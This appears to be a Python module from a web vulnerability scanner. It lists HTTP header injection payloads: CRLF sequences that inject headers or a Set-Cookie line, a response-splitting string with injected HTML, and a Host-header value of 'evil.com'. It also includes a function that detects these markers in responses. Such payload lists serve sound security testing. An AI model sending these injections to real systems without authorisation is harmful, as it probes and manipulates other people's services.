"""
scanner/payloads/header_injection.py

HTTP Header Injection / Response Splitting payloads.
Tests for CRLF injection vulnerabilities.
"""

from .base import Payload


def header_injection_confirm(response_text: str) -> bool:
    """
    Check for header injection indicators.
    Look for injected header content in response.
    """
    indicators = [
        "x-injected:",
        "set-cookie: malicious",
        "x-test: injected",
        "\r\n\r\n",  # Response splitting
    ]
    
    text_lower = response_text.lower()
    return any(ind.lower() in text_lower for ind in indicators)


HEADER_INJECTION_PAYLOADS = [
    # ============================================
    # CRLF INJECTION
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="CRLF basic",
        payload="%0d%0aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="CRLF with cookie",
        payload="%0d%0aSet-Cookie: malicious=true",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
    Payload(
        vuln_type="HeaderInjection",
        name="CRLF double encoded",
        payload="%250d%250aX-Injected: true",
        contexts=["url"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
    
    # ============================================
    # RESPONSE SPLITTING
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Response split",
        payload="%0d%0a%0d%0a<html>Injected</html>",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=header_injection_confirm
    ),
    
    # ============================================
    # HOST HEADER INJECTION
    # ============================================
    Payload(
        vuln_type="HeaderInjection",
        name="Host override",
        payload="evil.com",
        contexts=["header"],
        severity="Medium",
        safe=True,
        confirmation=header_injection_confirm
    ),
]